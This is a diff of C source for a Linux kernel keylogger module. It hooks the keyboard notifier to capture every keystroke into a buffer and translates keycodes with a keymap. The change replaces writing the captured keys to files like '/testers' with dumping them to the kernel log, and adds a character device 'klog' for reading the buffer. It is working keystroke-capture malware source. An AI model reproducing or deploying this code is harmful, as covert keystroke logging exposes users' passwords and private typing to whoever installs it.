@@ -46,123 +46,126 @@ static const char *keymap[][2] = {
 {"_PAUSE_", "_PAUSE_"}, 
 };
 
-struct file* file_open(const char* path, int flags, int rights) {
-    struct file* filep = NULL;
-    mm_segment_t oldfs;
-    int err = 0;
+#define DEVICE_NAME "klog"
+#define SUCCESS 0
 
-    oldfs = get_fs();
-    set_fs(get_ds());
+static int keylog(struct notifier_block *, unsigned long, void *);
+static int device_open(struct inode *, struct file *);
+static int device_release(struct inode *, struct file *);
+static ssize_t device_read(struct file *, char *, size_t, loff_t *);
 
-    filep = filp_open(path, flags, rights);
-    set_fs(oldfs);
-
-    if(IS_ERR(filep)) {
-	err = PTR_ERR(filep);
-    }
-    return filep;
-}
-
-void file_close(struct file* filename) {
-    filp_close(filename, NULL);
-}
-
-int file_write(struct file* filename, unsigned long long offset, unsigned char* data, unsigned int size) {
-    mm_segment_t oldfs;
-    int ret;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-
-    ret = vfs_write(filename, data, size, &offset);
-
-    set_fs(oldfs);
-    return ret;
-}
+static int major;
+static int is_open = 0;
 
 static int shiftKey = 0;
-static struct file *fp;
 struct semaphore sem;
-char keybuf[300] = {};
 
-int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
+static char keybuf[300] = {};
+static char *msg_ptr;
+
+static struct file_operations fops = {
+	.owner = THIS_MODULE,
+	.read = device_read,
+   	.open = device_open,
+	.release = device_release
+};
+
+static struct notifier_block nb = {
+	.notifier_call = keylog
+};
+
+static int device_open(struct inode *inode, struct file *file) {
+
+	if(is_open)
+		return -EBUSY;
+
+	msg_ptr = keybuf;
+	is_open++;
+	try_module_get(THIS_MODULE);
+
+	return SUCCESS;
+}
+
+static int device_release(struct inode *inode, struct file *file) {
+	is_open--;
+	module_put(THIS_MODULE);
+
+	return 0;
+}
+
+static ssize_t device_read(struct file *filp, char *buff, size_t len, loff_t * off) {
+	int bytes_read = 0;
+
+	if(*msg_ptr == 0)
+		return 0;
+
+	while(len && *msg_ptr) {
+		put_user(*(msg_ptr++), buff++);
+
+		len--;
+		bytes_read++;
+	}
+
+	return bytes_read;
+}
+
+static int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
     //struct file *fp = file_open("/testicle", O_WRONLY|O_CREAT, 0664);
     
     if(code == KBD_KEYCODE) {
-	if(param->value==42 || param->value==54) {
-	    down(&sem);
+		if(param->value==42 || param->value==54) {
+	    	down(&sem);
 
-	    if(param->down)
-		shiftKey = 1;
-	    else
-		shiftKey = 0;
+	    	if(param->down)
+				shiftKey = 1;
+	    	else
+				shiftKey = 0;
 
-	    up(&sem);
-	    return NOTIFY_OK;
+	    	up(&sem);
+	    	return NOTIFY_OK;
+		}
 	}
 
 	if(param->down) {
-	    //down(&sem);
 
 	    if(strlen(keybuf) > 200) {
-		fp = file_open("/testers", O_RDWR|O_APPEND, 0644);
-		file_write(fp, fp->f_pos, keybuf, strlen(keybuf));
-		file_close(fp);
-
-		keybuf[0] = '\0';;
+			printk(KERN_INFO "%s\n", keybuf); 
+			keybuf[0] = '\0';
 	    }
 
 	    down(&sem);
 	    if(shiftKey == 0) {
-		//file_write(fp, fp->f_pos, keymap[param->value][0], 
-		//	strlen(keymap[param->value][0]));
-		strncat(keybuf, keymap[param->value][0], 
-		    strlen(keymap[param->value][0]));
+			strncat(keybuf, keymap[param->value][0], 
+		    	strlen(keymap[param->value][0]));
 			
-		printk(KERN_INFO "length: %d\n", (int)strlen(keybuf));
+			printk(KERN_INFO "length: %d\n", (int)strlen(keybuf));
 	    } else {
-		printk(KERN_INFO "%s \n", keymap[param->value][1]);
+			printk(KERN_INFO "%s \n", keymap[param->value][1]);
 	    }
 	    up(&sem);
 
-	    /*if(offset > 20) {
-		//fp = file_open("/home/testers", O_WRONLY|O_CREAT, 0664);
-		//file_write(fp, fp->f_pos, keybuf, strlen(keybuf));
-		//file_close(fp);
-		printk(KERN_INFO "keybuf: %s offset: %d\n", keybuf,(int)offset);
-		offset = 0;
-		keybuf[0] = '\0';
-		//fp = file_open("/home/testers", O_WRONLY, 0664);
-	    }*/
-	    //up(&sem);
-	}
     }
 
     return NOTIFY_OK;
 }
 
-static struct notifier_block klog_nb =
-{
-    .notifier_call = keylog
-};
-
-//static struct file *fp;
-
 static int __init init_klog(void) {
-    register_keyboard_notifier(&klog_nb);
+	keybuf[0] = '\0';
+
+    register_keyboard_notifier(&nb);
     printk(KERN_INFO "Registering keylager\n");
     sema_init(&sem, 1);
 
-    //fp = file_open("/testers", O_WRONLY|O_CREAT, 0664); 
+	//major = register_chrdev(0, DEVICE_NAME, &fops);
+	//printk(KERN_INFO "major: %d\n", major);
 
     return 0;
 }
 
 static void __exit cleanup_klog(void) {
-    unregister_keyboard_notifier(&klog_nb);
-    //file_write(fp, fp->f_pos, keybuf, sizeof(keybuf));
-    file_close(fp);
+    unregister_keyboard_notifier(&nb);
+    //unregister_chrdev(major, DEVICE_NAME);
 
     printk(KERN_INFO "Unregistered keylager\n");
 }
